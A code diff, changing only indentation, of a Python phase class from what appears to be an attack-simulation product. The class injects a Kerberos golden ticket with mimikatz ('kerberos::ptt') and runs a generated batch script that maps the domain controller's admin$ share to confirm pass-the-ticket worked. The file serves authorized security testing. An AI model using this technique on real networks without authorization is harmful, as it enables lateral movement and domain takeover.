@@ -2,302 +2,302 @@ import logging
 import re
 from tempfile import NamedTemporaryFile
 try:
-  # noinspection PyUnresolvedReferences
-  import aipythonlib
+    # noinspection PyUnresolvedReferences
+    import aipythonlib
 except:
-  logging.error('Error importing aipythonlib')
+    logging.error('Error importing aipythonlib')
 from ai_utils.phases.abstract_phase import AbstractPhaseClass
 from ai_utils.scenarios.globals import StringUtils, FileUtils, PathUtils, NetworkUtils
 
 class ExecuteUsingKerberosTicketPhaseClass(AbstractPhaseClass):
-  TrackerId = "370"
-  Subject = "Execute Using Kerberos Ticket"
-  Description = "Execute Using Kerberos Ticket"
+    TrackerId = "370"
+    Subject = "Execute Using Kerberos Ticket"
+    Description = "Execute Using Kerberos Ticket"
 
-  SUPPORTED_TICKETS = ['golden']
+    SUPPORTED_TICKETS = ['golden']
 
-  def __init__(self, isPhaseCritical, ticketFile, ticketType='golden', targetMachineWithFQDN=''):
-    AbstractPhaseClass.__init__(self, isPhaseCritical)
-    logging.info('Executing Execute Using Kerberos Ticket Phase...')
-    self.TicketType = ticketType.lower()
-    self.TicketFile = self._SetupTicketFile(ticketFile)
-    self.FQDN = NetworkUtils.GetMachineFQDN()
-    self.TargetMachineWithFQDN = self._SetupTargetMachine(targetMachineWithFQDN, fqdn=self.FQDN)
-    self.RemoteCommandOutputLogPath = self._SetupRemoteCommandOutputLogPath()
-    self.RemoteCommandScript = self._SetupRemoteCommandScript(self.TargetMachineWithFQDN,
-                                                              self.RemoteCommandOutputLogPath)
-    self.TestSuccessPattern = self._SetupTestSuccessPattern()
-    self.CommandOutput = ''
+    def __init__(self, isPhaseCritical, ticketFile, ticketType='golden', targetMachineWithFQDN=''):
+        AbstractPhaseClass.__init__(self, isPhaseCritical)
+        logging.info('Executing Execute Using Kerberos Ticket Phase...')
+        self.TicketType = ticketType.lower()
+        self.TicketFile = self._SetupTicketFile(ticketFile)
+        self.FQDN = NetworkUtils.GetMachineFQDN()
+        self.TargetMachineWithFQDN = self._SetupTargetMachine(targetMachineWithFQDN, fqdn=self.FQDN)
+        self.RemoteCommandOutputLogPath = self._SetupRemoteCommandOutputLogPath()
+        self.RemoteCommandScript = self._SetupRemoteCommandScript(self.TargetMachineWithFQDN,
+                                                                  self.RemoteCommandOutputLogPath)
+        self.TestSuccessPattern = self._SetupTestSuccessPattern()
+        self.CommandOutput = ''
 
-  def Setup(self):
-    if self.TicketType not in self.SUPPORTED_TICKETS:
-      self.PhaseReporter.Error('Ticket type {0} is not supported: {1}'.format(self.TicketType, self.SUPPORTED_TICKETS))
-      return False
+    def Setup(self):
+        if self.TicketType not in self.SUPPORTED_TICKETS:
+            self.PhaseReporter.Error('Ticket type {0} is not supported: {1}'.format(self.TicketType, self.SUPPORTED_TICKETS))
+            return False
 
-    if self.TicketType == 'golden':
-      if not PathUtils.FindFile("mimikatz.exe"):
-        self.PhaseReporter.Error("mimikatz.exe not found in path")
-        return False
-      if self._checkIfCriticalFailureAndLogIt():
-        return False
-      if StringUtils.IsEmptyOrNull(self.TargetMachineWithFQDN):
-        self.PhaseReporter.Error('Target Machine parameter was empty and its value could not be retrieved.')
-        return False
-      if StringUtils.IsEmptyOrNull(self.RemoteCommandScript):
-        self.PhaseReporter.Error('Remote Command Script parameter was empty and its value could not be retrieved.')
-        return False
-      if StringUtils.IsEmptyOrNull(self.RemoteCommandOutputLogPath):
-        self.PhaseReporter.Error('Remote Command Output Log Path parameter was empty and its value could not be '
-                                 'retrieved.')
-        return False
-      if StringUtils.IsEmptyOrNull(self.TestSuccessPattern):
-        self.PhaseReporter.Error('Test Success Pattern parameter was empty and its value could not be retrieved.')
-        return False
-    return True
+        if self.TicketType == 'golden':
+            if not PathUtils.FindFile("mimikatz.exe"):
+                self.PhaseReporter.Error("mimikatz.exe not found in path")
+                return False
+            if self._checkIfCriticalFailureAndLogIt():
+                return False
+            if StringUtils.IsEmptyOrNull(self.TargetMachineWithFQDN):
+                self.PhaseReporter.Error('Target Machine parameter was empty and its value could not be retrieved.')
+                return False
+            if StringUtils.IsEmptyOrNull(self.RemoteCommandScript):
+                self.PhaseReporter.Error('Remote Command Script parameter was empty and its value could not be retrieved.')
+                return False
+            if StringUtils.IsEmptyOrNull(self.RemoteCommandOutputLogPath):
+                self.PhaseReporter.Error('Remote Command Output Log Path parameter was empty and its value could not be '
+                                         'retrieved.')
+                return False
+            if StringUtils.IsEmptyOrNull(self.TestSuccessPattern):
+                self.PhaseReporter.Error('Test Success Pattern parameter was empty and its value could not be retrieved.')
+                return False
+        return True
 
-  def Cleanup(self):
-    # ticket file is not removed given that can be a ticket generated by customer
-    return self.RemoveOutputLogFile() and self.RemoveCommandScript()
+    def Cleanup(self):
+        # ticket file is not removed given that can be a ticket generated by customer
+        return self.RemoveOutputLogFile() and self.RemoveCommandScript()
 
-  def RemoveTicket(self):
-    return self._RemoveFile(self.TicketFile)
+    def RemoveTicket(self):
+        return self._RemoveFile(self.TicketFile)
 
-  def RemoveOutputLogFile(self):
-    return self._RemoveFile(self.RemoteCommandOutputLogPath)
+    def RemoveOutputLogFile(self):
+        return self._RemoveFile(self.RemoteCommandOutputLogPath)
 
-  def RemoveCommandScript(self):
-    return self._RemoveFile(self.RemoteCommandScript)
+    def RemoveCommandScript(self):
+        return self._RemoveFile(self.RemoteCommandScript)
 
-  def Run(self):
-    phaseSuccessful = self._ExecuteUsingTicket()
-    if phaseSuccessful:
-      self.PhaseReporter.Info("Successfully executed command passing the kerberos {0} ticket".format(self.TicketType))
-      self.PhaseReporter.Report('A command was executed from the local machine to a remote machine using a Kerberos Golden Ticket through Mimikatz')
-    else:
-      self.PhaseReporter.Info("Failed to execute command passing the kerberos {0} ticket".format(self.TicketType))
-      self._checkIfCriticalFailureAndLogIt()
-    return phaseSuccessful
-
-  ###
-  # Internal methods
-  ##################
-
-  def _RemoveFile(self, fileToRemove):
-    success = FileUtils.DeleteFile(fileToRemove)
-    if success:
-      logging.info('File was correctly removed: {0}'.format(fileToRemove))
-    else:
-      self.PhaseReporter.Warn('File could not be deleted: {0}'.format(fileToRemove))
-    return success
-
-  def _MimikatzCommand(self):
-    if self.TicketType == 'golden':
-      cmd = '"kerberos::ptt {0}" '.format(self.TicketFile)
-    else:
-      logging.error('Kerberos ticket type {0} not supported. Supported tickets: {1}'.format(self.TicketType,
-                                                                                            self.SUPPORTED_TICKETS))
-      cmd = ''
-    return cmd
-
-  def _ExecuteUsingTicket(self):
-    self.PhaseReporter.Info('Executing remote command using Kerberos ticket...')
-    cmd1 = self._MimikatzCommand()
-    cmd2 = 'exit'
-    if not cmd1:
-      logging.error('Mimikatz command line could not be built')
-      return False
-    commandline = cmd1 + cmd2
-    timeout = 30000
-    errorCode, exitCode, stdOut, stdError = aipythonlib.AiRunCommandAsActiveLoggedInUser("mimikatz.exe", commandline, timeout)
-    logging.info('Mimikatz command executed: {0}. Output: {1}'.format(commandline, stdOut))
-    # here we don't need to sleep given that we don't check command execution result in an external file
-    if errorCode == 0 and not stdError:
-      # execute command once ticket has been injected in memory
-      empty_args = ''
-      errorCode, exitCode, stdOut, stdError = aipythonlib.AiRunCommandAsActiveLoggedInUser(self.RemoteCommandScript, empty_args, timeout, True)
-      logging.info('Executed command: {0}. Output: {1}'.format(self.RemoteCommandScript, stdOut))
-      if errorCode == 0 and not stdError:
-        if FileUtils.FileExists(self.RemoteCommandOutputLogPath) and FileUtils.GetFilesize(self.RemoteCommandOutputLogPath) > 0:
-          self.RemoteCommandOutput = FileUtils.ReadFromFile(self.RemoteCommandOutputLogPath)
+    def Run(self):
+        phaseSuccessful = self._ExecuteUsingTicket()
+        if phaseSuccessful:
+            self.PhaseReporter.Info("Successfully executed command passing the kerberos {0} ticket".format(self.TicketType))
+            self.PhaseReporter.Report('A command was executed from the local machine to a remote machine using a Kerberos Golden Ticket through Mimikatz')
         else:
-          logging.error('Remote command output file has not been created or is empty. This means that the command has failed.')
-        pattern = re.compile(self.TestSuccessPattern)
-        if pattern.search(self.RemoteCommandOutput):
-          return True
+            self.PhaseReporter.Info("Failed to execute command passing the kerberos {0} ticket".format(self.TicketType))
+            self._checkIfCriticalFailureAndLogIt()
+        return phaseSuccessful
+
+    ###
+    # Internal methods
+    ##################
+
+    def _RemoveFile(self, fileToRemove):
+        success = FileUtils.DeleteFile(fileToRemove)
+        if success:
+            logging.info('File was correctly removed: {0}'.format(fileToRemove))
         else:
-          logging.error('Test Success Pattern could not be found in command output file. Remote command has failed.')
-          logging.error('Remote Output Command file contents: {0}'.format(self.RemoteCommandOutput))
-          return False
-      else:
-        logging.error('Remote command script could not be executed passing the ticket using Mimikatz. '
-                      'Output: {}, Error Code: {}. Error Message: {}'.format(stdOut, errorCode, stdError.strip()))
-    else:
-      logging.error('Kerberos Ticket could not be injected in memory. '
-                    'Output: {}, Error Code: {}. Error Message: {}'.format(stdOut, errorCode, stdError.strip()))
-    return False
+            self.PhaseReporter.Warn('File could not be deleted: {0}'.format(fileToRemove))
+        return success
 
-  def _SetupTicketFile(self, ticketFile):
-    param = ''
-    if self.TicketType == 'golden':
-      if ticketFile:
-        if FileUtils.FileExists(ticketFile) and FileUtils.GetFilesize(ticketFile) > 0:
-          param = str(ticketFile)
-    else:
-      logging.error('Kerberos ticket type {0} not supported. Supported tickets: {1}'.format(self.TicketType,
-                                                                                            self.SUPPORTED_TICKETS))
-    if param:
-      logging.info("Kerberos Ticket File passed as parameter to execute using Kerberos ticket: {0}".format(param))
-    else:
-      logging.error("Kerberos Ticket File passed as parameter does not exist or is empty: {0}".format(ticketFile))
-    return param
+    def _MimikatzCommand(self):
+        if self.TicketType == 'golden':
+            cmd = '"kerberos::ptt {0}" '.format(self.TicketFile)
+        else:
+            logging.error('Kerberos ticket type {0} not supported. Supported tickets: {1}'.format(self.TicketType,
+                                                                                                  self.SUPPORTED_TICKETS))
+            cmd = ''
+        return cmd
 
-  def _GetMachineFQDN(self):
-    param = ''
-    if self.TicketType == 'golden':
-      param = NetworkUtils.GetMachineFQDN()
-      if param:
-        self.PhaseReporter.Info('FQDN value used to execute using Kerberos ticket: {0}'.format(param))
-    else:
-      logging.error('Kerberos ticket type {0} not supported. Supported tickets: {1}'.format(self.TicketType,
-                                                                                            self.SUPPORTED_TICKETS))
-    return param
+    def _ExecuteUsingTicket(self):
+        self.PhaseReporter.Info('Executing remote command using Kerberos ticket...')
+        cmd1 = self._MimikatzCommand()
+        cmd2 = 'exit'
+        if not cmd1:
+            logging.error('Mimikatz command line could not be built')
+            return False
+        commandline = cmd1 + cmd2
+        timeout = 30000
+        errorCode, exitCode, stdOut, stdError = aipythonlib.AiRunCommandAsActiveLoggedInUser("mimikatz.exe", commandline, timeout)
+        logging.info('Mimikatz command executed: {0}. Output: {1}'.format(commandline, stdOut))
+        # here we don't need to sleep given that we don't check command execution result in an external file
+        if errorCode == 0 and not stdError:
+            # execute command once ticket has been injected in memory
+            empty_args = ''
+            errorCode, exitCode, stdOut, stdError = aipythonlib.AiRunCommandAsActiveLoggedInUser(self.RemoteCommandScript, empty_args, timeout, True)
+            logging.info('Executed command: {0}. Output: {1}'.format(self.RemoteCommandScript, stdOut))
+            if errorCode == 0 and not stdError:
+                if FileUtils.FileExists(self.RemoteCommandOutputLogPath) and FileUtils.GetFilesize(self.RemoteCommandOutputLogPath) > 0:
+                    self.RemoteCommandOutput = FileUtils.ReadFromFile(self.RemoteCommandOutputLogPath)
+                else:
+                    logging.error('Remote command output file has not been created or is empty. This means that the command has failed.')
+                pattern = re.compile(self.TestSuccessPattern)
+                if pattern.search(self.RemoteCommandOutput):
+                    return True
+                else:
+                    logging.error('Test Success Pattern could not be found in command output file. Remote command has failed.')
+                    logging.error('Remote Output Command file contents: {0}'.format(self.RemoteCommandOutput))
+                    return False
+            else:
+                logging.error('Remote command script could not be executed passing the ticket using Mimikatz. '
+                              'Output: {}, Error Code: {}. Error Message: {}'.format(stdOut, errorCode, stdError.strip()))
+        else:
+            logging.error('Kerberos Ticket could not be injected in memory. '
+                          'Output: {}, Error Code: {}. Error Message: {}'.format(stdOut, errorCode, stdError.strip()))
+        return False
 
-  def _SetupTargetMachine(self, targetMachine, fqdn=''):
-    param = ''
-    if self.TicketType == 'golden':
-      if targetMachine:
-        param = str(targetMachine)
-        logging.info("Target Machine passed as parameter to execute using Kerberos ticket: {0}".format(param))
+    def _SetupTicketFile(self, ticketFile):
+        param = ''
+        if self.TicketType == 'golden':
+            if ticketFile:
+                if FileUtils.FileExists(ticketFile) and FileUtils.GetFilesize(ticketFile) > 0:
+                    param = str(ticketFile)
+        else:
+            logging.error('Kerberos ticket type {0} not supported. Supported tickets: {1}'.format(self.TicketType,
+                                                                                                  self.SUPPORTED_TICKETS))
+        if param:
+            logging.info("Kerberos Ticket File passed as parameter to execute using Kerberos ticket: {0}".format(param))
+        else:
+            logging.error("Kerberos Ticket File passed as parameter does not exist or is empty: {0}".format(ticketFile))
         return param
-      else:
-        self.PhaseReporter.Info('User has not specified target machine. Searching domain controller machine...')
-        DCMachineName = NetworkUtils.GetDomainControllerMachineName()
-        if fqdn:
-          param = DCMachineName + '.' + fqdn
+
+    def _GetMachineFQDN(self):
+        param = ''
+        if self.TicketType == 'golden':
+            param = NetworkUtils.GetMachineFQDN()
+            if param:
+                self.PhaseReporter.Info('FQDN value used to execute using Kerberos ticket: {0}'.format(param))
         else:
-          newFQDN = NetworkUtils.GetMachineFQDN()
-          param = DCMachineName + '.' + newFQDN if newFQDN else DCMachineName
-    else:
-      logging.error('Kerberos ticket type {0} not supported. Supported tickets: {1}'.format(self.TicketType,
-                                                                                            self.SUPPORTED_TICKETS))
-    if param:
-      logging.info('Retrieved Target Machine name (Domain Controller): {0}'.format(param))
-    else:
-      logging.warning('Target Machine name to execute using Kerberos ticket could not be retrieved.')
-    return param
+            logging.error('Kerberos ticket type {0} not supported. Supported tickets: {1}'.format(self.TicketType,
+                                                                                                  self.SUPPORTED_TICKETS))
+        return param
 
-  def _SetupRemoteCommandScript(self, remoteMachineName, logFile):
-    self.PhaseReporter.Info('Command to be executed using Pass The Hash will map the remote admin$ share')
-    param = ''
-    if self.TicketType == 'golden':
-      if not (StringUtils.IsEmptyOrNull(remoteMachineName) and StringUtils.IsEmptyOrNull(logFile)):
-        # If remote target machine is set as an IP, the golden ticket might not work. We try just in case.
-        ipAddress = self._GetIPFromComputerName(remoteMachineName)
-        param = PathUtils.GetTempFile(prefixArg='ai_cmd_eukt_', suffixArg='.bat')
-        command = self._GetBatchScriptContents(remoteMachineName, ipAddress, logFile)
-        with open(param, 'w') as fd:
-          fd.write(command)
-      else:
-        logging.warning('Empty remote machine name or log file when building remote command to execute.')
-    else:
-      logging.error('Kerberos ticket type {0} not supported. Supported tickets: {1}'.format(self.TicketType,
-                                                                                            self.SUPPORTED_TICKETS))
-    if param:
-      logging.info('Remote Command Script file used to execute using Kerberos ticket: {0}'.format(param))
-    else:
-      logging.warning('Remote Command Script value to execute using Kerberos ticket could not be retrieved.')
-    return param
+    def _SetupTargetMachine(self, targetMachine, fqdn=''):
+        param = ''
+        if self.TicketType == 'golden':
+            if targetMachine:
+                param = str(targetMachine)
+                logging.info("Target Machine passed as parameter to execute using Kerberos ticket: {0}".format(param))
+                return param
+            else:
+                self.PhaseReporter.Info('User has not specified target machine. Searching domain controller machine...')
+                DCMachineName = NetworkUtils.GetDomainControllerMachineName()
+                if fqdn:
+                    param = DCMachineName + '.' + fqdn
+                else:
+                    newFQDN = NetworkUtils.GetMachineFQDN()
+                    param = DCMachineName + '.' + newFQDN if newFQDN else DCMachineName
+        else:
+            logging.error('Kerberos ticket type {0} not supported. Supported tickets: {1}'.format(self.TicketType,
+                                                                                                  self.SUPPORTED_TICKETS))
+        if param:
+            logging.info('Retrieved Target Machine name (Domain Controller): {0}'.format(param))
+        else:
+            logging.warning('Target Machine name to execute using Kerberos ticket could not be retrieved.')
+        return param
 
-  def _GetIPFromComputerName(self, computerName):
-    ipAddress = NetworkUtils.GetIPFromHostName(computerName)
-    if not ipAddress:
-      ipAddress = NetworkUtils.GetIPFromHostName(computerName.replace('.' + self.FQDN, '', 1))
-    return ipAddress
+    def _SetupRemoteCommandScript(self, remoteMachineName, logFile):
+        self.PhaseReporter.Info('Command to be executed using Pass The Hash will map the remote admin$ share')
+        param = ''
+        if self.TicketType == 'golden':
+            if not (StringUtils.IsEmptyOrNull(remoteMachineName) and StringUtils.IsEmptyOrNull(logFile)):
+                # If remote target machine is set as an IP, the golden ticket might not work. We try just in case.
+                ipAddress = self._GetIPFromComputerName(remoteMachineName)
+                param = PathUtils.GetTempFile(prefixArg='ai_cmd_eukt_', suffixArg='.bat')
+                command = self._GetBatchScriptContents(remoteMachineName, ipAddress, logFile)
+                with open(param, 'w') as fd:
+                    fd.write(command)
+            else:
+                logging.warning('Empty remote machine name or log file when building remote command to execute.')
+        else:
+            logging.error('Kerberos ticket type {0} not supported. Supported tickets: {1}'.format(self.TicketType,
+                                                                                                  self.SUPPORTED_TICKETS))
+        if param:
+            logging.info('Remote Command Script file used to execute using Kerberos ticket: {0}'.format(param))
+        else:
+            logging.warning('Remote Command Script value to execute using Kerberos ticket could not be retrieved.')
+        return param
 
-  def _GetBatchScriptContents(self, remoteMachineName, remoteMachineIP, logFile):
-    command = r"""
-    setlocal enabledelayedexpansion
+    def _GetIPFromComputerName(self, computerName):
+        ipAddress = NetworkUtils.GetIPFromHostName(computerName)
+        if not ipAddress:
+            ipAddress = NetworkUtils.GetIPFromHostName(computerName.replace('.' + self.FQDN, '', 1))
+        return ipAddress
 
-    :detectfreedrive
-    set drive=
-    for %%i in (A,B,C,D,E,F,G,H,I,J,K,L,M,N,O,P,Q,R,S,T,U,V,W,X,Y,Z) do (
-        set "drive=%%i:"
-        subst !drive! %SystemDrive%\ >nul
-        if !errorlevel! == 0 (
-            REM subst makes better check than "if exist" (optical drives w/o media)
-            subst !drive! /d >nul
-            goto :detectedfreedrive
+    def _GetBatchScriptContents(self, remoteMachineName, remoteMachineIP, logFile):
+        command = r"""
+        setlocal enabledelayedexpansion
+
+        :detectfreedrive
+        set drive=
+        for %%i in (A,B,C,D,E,F,G,H,I,J,K,L,M,N,O,P,Q,R,S,T,U,V,W,X,Y,Z) do (
+            set "drive=%%i:"
+            subst !drive! %SystemDrive%\ >nul
+            if !errorlevel! == 0 (
+                REM subst makes better check than "if exist" (optical drives w/o media)
+                subst !drive! /d >nul
+                goto :detectedfreedrive
+            )
         )
-    )
-    exit /b 2
-    :detectedfreedrive
+        exit /b 2
+        :detectedfreedrive
 
-    >{1} 2>&1 (
-      echo "Mapping drive using name: {0} and also ip: {2}"
-      net use !drive! "\\{0}\admin$" /p:no /y
-      net use !drive! "\\{2}\admin$" /p:no /y
-      echo "Checking drive existence"
-      if exist !drive!\ echo Pass the Ticket Successful
-      echo "Deleting drive"
-      net use /delete !drive!
-    )
+        >{1} 2>&1 (
+          echo "Mapping drive using name: {0} and also ip: {2}"
+          net use !drive! "\\{0}\admin$" /p:no /y
+          net use !drive! "\\{2}\admin$" /p:no /y
+          echo "Checking drive existence"
+          if exist !drive!\ echo Pass the Ticket Successful
+          echo "Deleting drive"
+          net use /delete !drive!
+        )
 
-    exit /b 0
-    """.format(remoteMachineName, logFile, remoteMachineIP)
-    logging.info('Batch script command to be executed: {}'.format(command))
-    return command
+        exit /b 0
+        """.format(remoteMachineName, logFile, remoteMachineIP)
+        logging.info('Batch script command to be executed: {}'.format(command))
+        return command
 
-  def _SetupRemoteCommandOutputLogPath(self):
-    param = ''
-    if self.TicketType == 'golden':
-      param = PathUtils.GetTempFile(prefixArg='ai_eukt_log_', suffixArg='.log')
-      logging.info('Remote Command Output Log Path value used to execute using Kerberos ticket: {0}'.format(param))
-    else:
-      logging.error('Kerberos ticket type {0} not supported. Supported tickets: {1}'.format(self.TicketType,
-                                                                                            self.SUPPORTED_TICKETS))
-    if not param:
-      logging.warning('Remote Command Output Log Path value to execute using Kerberos ticket could not be retrieved.')
-    return param
+    def _SetupRemoteCommandOutputLogPath(self):
+        param = ''
+        if self.TicketType == 'golden':
+            param = PathUtils.GetTempFile(prefixArg='ai_eukt_log_', suffixArg='.log')
+            logging.info('Remote Command Output Log Path value used to execute using Kerberos ticket: {0}'.format(param))
+        else:
+            logging.error('Kerberos ticket type {0} not supported. Supported tickets: {1}'.format(self.TicketType,
+                                                                                                  self.SUPPORTED_TICKETS))
+        if not param:
+            logging.warning('Remote Command Output Log Path value to execute using Kerberos ticket could not be retrieved.')
+        return param
 
-  def _SetupTestSuccessPattern(self):
-    param = ''
-    if self.TicketType == 'golden':
-      param = 'Pass the Ticket Successful'
-      logging.info('Test Success Pattern value used to execute using Kerberos ticket: {0}'.format(param))
-    else:
-      logging.error('Kerberos ticket type {0} not supported. Supported tickets: {1}'.format(self.TicketType,
-                                                                                            self.SUPPORTED_TICKETS))
-    if not param:
-      logging.warning('Test Success Pattern value to execute using Kerberos ticket could not be retrieved.')
-    return param
+    def _SetupTestSuccessPattern(self):
+        param = ''
+        if self.TicketType == 'golden':
+            param = 'Pass the Ticket Successful'
+            logging.info('Test Success Pattern value used to execute using Kerberos ticket: {0}'.format(param))
+        else:
+            logging.error('Kerberos ticket type {0} not supported. Supported tickets: {1}'.format(self.TicketType,
+                                                                                                  self.SUPPORTED_TICKETS))
+        if not param:
+            logging.warning('Test Success Pattern value to execute using Kerberos ticket could not be retrieved.')
+        return param
 
-  def _checkIfCriticalFailureAndLogIt(self):
-    criticalError = False
-    correctDCMachine = self._isDCMachineNameCorrect(self.TargetMachineWithFQDN)
-    if not correctDCMachine and not self.FQDN:
-      self.PhaseReporter.Info('Most probably the phase failed because there is not a user logged '
-                              'in the asset machine. Environment variables could not be retrieved.')
-      criticalError = True
-    else:
-      if not self.FQDN:
-        self.PhaseReporter.Info('Most probably the phase failed because asset machine is not inside '
-                                'a Windows Domain. FQDN could not be retrieved.')
-        criticalError = True
-      if not correctDCMachine:
-        self.PhaseReporter.Info('Most probably the phase failed because the user logged in the asset '
-                                'machine is not a domain user. DC machine name could not be retrieved.')
-        criticalError = True
-    if criticalError:
-      self._ShowRequirements()
-    return criticalError
+    def _checkIfCriticalFailureAndLogIt(self):
+        criticalError = False
+        correctDCMachine = self._isDCMachineNameCorrect(self.TargetMachineWithFQDN)
+        if not correctDCMachine and not self.FQDN:
+            self.PhaseReporter.Info('Most probably the phase failed because there is not a user logged '
+                                    'in the asset machine. Environment variables could not be retrieved.')
+            criticalError = True
+        else:
+            if not self.FQDN:
+                self.PhaseReporter.Info('Most probably the phase failed because asset machine is not inside '
+                                        'a Windows Domain. FQDN could not be retrieved.')
+                criticalError = True
+            if not correctDCMachine:
+                self.PhaseReporter.Info('Most probably the phase failed because the user logged in the asset '
+                                        'machine is not a domain user. DC machine name could not be retrieved.')
+                criticalError = True
+        if criticalError:
+            self._ShowRequirements()
+        return criticalError
 
-  def _isDCMachineNameCorrect(self, machineName):
-    return machineName and machineName != '.' + self.FQDN
+    def _isDCMachineNameCorrect(self, machineName):
+        return machineName and machineName != '.' + self.FQDN
 
-  def _ShowRequirements(self):
-    self.PhaseReporter.Info("")
-    self.PhaseReporter.Info("For this phase to succeed with the default parameters, these requirements should be satisfied:")
-    self.PhaseReporter.Info("  1. The asset machine should be inside a windows domain.")
-    self.PhaseReporter.Info("  2. A Kerberos ticket with the privileges of the domain administrator should be passed as a parameter.")
-    self.PhaseReporter.Info("  3. The asset machine should have a user session opened (a user should be logged in while the scenario is executed).")
-    self.PhaseReporter.Info("  4. The logged in user should have logged in against the domain controller (so the user should be a domain user).")
+    def _ShowRequirements(self):
+        self.PhaseReporter.Info("")
+        self.PhaseReporter.Info("For this phase to succeed with the default parameters, these requirements should be satisfied:")
+        self.PhaseReporter.Info("  1. The asset machine should be inside a windows domain.")
+        self.PhaseReporter.Info("  2. A Kerberos ticket with the privileges of the domain administrator should be passed as a parameter.")
+        self.PhaseReporter.Info("  3. The asset machine should have a user session opened (a user should be logged in while the scenario is executed).")
+        self.PhaseReporter.Info("  4. The logged in user should have logged in against the domain controller (so the user should be a domain user).")
